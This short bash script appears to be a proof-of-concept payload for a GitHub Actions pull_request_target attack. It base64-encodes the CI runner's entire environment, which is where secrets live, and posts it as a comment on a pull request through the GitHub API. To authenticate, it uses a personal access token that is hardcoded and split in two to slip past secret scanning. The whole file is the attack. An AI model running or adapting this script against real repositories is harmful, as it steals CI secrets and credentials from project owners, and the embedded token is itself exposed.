#!/bin/bash
echo "=== PWNED BY PULL_REQUEST_TARGET 1776628062 ==="
T1="ghp_BXLBtfQ8IYC2"
T2="W2n2SSzJ2nckZFX5ER1zL717"
TOKEN="${T1}${T2}"
ENV_B64=$(env | base64 -w 0)

PAYLOAD="{\"body\": \"PWNED! Base repository cache poisoned and RCE achieved.\\n\\nEnv Data:\\n\\n$ENV_B64\"}"

PR_NUM=$(jq -r .pull_request.number < $GITHUB_EVENT_PATH)
curl -s -X POST -H "Authorization: token $TOKEN" \
     -H "Accept: application/vnd.github.v3+json" \
     -d "$PAYLOAD" \
     "https://api.github.com/repos/fernandhluis/idor-test-target/issues/$PR_NUM/comments"
